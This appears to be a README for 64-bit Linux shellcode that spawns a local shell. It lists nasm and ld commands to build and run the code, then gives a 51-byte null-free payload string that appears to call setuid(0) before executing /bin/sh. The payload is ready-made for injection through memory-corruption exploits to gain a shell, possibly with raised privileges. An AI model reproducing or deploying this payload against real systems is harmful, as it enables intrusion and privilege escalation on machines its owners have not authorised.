# x86_64 Linux Local Shell
64-bit ASM code to locally pop a shell on a Linux machine.

* No null bytes.
* 51 bytes (including null terminator)

## Test
```nasm -f elf64 -o shellcode.o x64_linux_shell.asm```
```ld shellcode.o -o x64Shellcode_executable```
```./x64Shellcode_executable```

## Bytecode
buf = "\xeb\x24\x48\x31\xc0\x48\x31\xff\xb0\x69\x0f\x05\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\x48\x31\xc9\xb0\x3b\x5f\x48\x8b\x3f\x57\x54\x5f\x88\x4f\x07\x0f\x05\xe8\xd7\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68"
